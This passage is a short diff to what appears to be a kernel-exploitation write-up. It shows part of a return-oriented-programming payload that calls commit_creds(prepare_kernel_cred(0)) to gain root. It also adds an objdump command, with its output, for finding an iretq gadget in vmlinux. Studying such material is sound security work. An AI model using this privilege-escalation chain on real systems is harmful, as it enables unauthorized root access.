@@ -53,3 +53,8 @@ payload[off++] = pop_rdi_ret;         // return address
     payload[off++] = 0x0;                      // dummy rbp
     payload[off++] = commit_creds;             // commit_creds(prepare_kernel_cred(0))
 ```
+- 
+```
+╰─ objdump -j .text -d ./vmlinux | grep iretq | head -1
+ffffffff8100c0d9:       48 cf                   iretq
+```
